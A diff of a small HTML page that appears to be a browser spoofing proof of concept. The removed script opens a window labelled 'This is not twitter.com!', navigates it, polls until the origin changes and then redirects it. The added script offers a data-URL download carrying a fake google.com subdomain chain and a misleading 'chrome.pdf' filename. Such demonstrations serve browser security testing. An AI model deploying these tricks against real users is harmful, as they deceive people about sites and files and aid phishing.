@@ -1,15 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Download HTML Data</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f4f4f4;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 18px;
+      cursor: pointer;
+      border: none;
+      background-color: #007bff;
+      color: white;
+      border-radius: 5px;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <button onclick="download()">Download</button>
 
-<script>
-  function next() {
-         w.location.replace('https://www.google.com:1234');
-        }
-
-  function f() {
-    w = window.open("");
-    w.document.write('<h2>This is not twitter.com!</h2>');
-    w.location = "https://twitter.com:90";
-    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
-  }
-</script>
-
-<a href="#" onclick="f()">Login Twitter</a>
+  <script>
+    function download() {
+      const a = document.createElement('a');
+      a.href = 'data:text/html,https://subdomain.subdomain.subdomain.subdomain.subdomain.subdomain.subdomain.google.com';
+      a.download = 'this secure file “chrome.pdf“ be careful with malicious .ipa';
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+    }
+  </script>
+</body>
+</html>
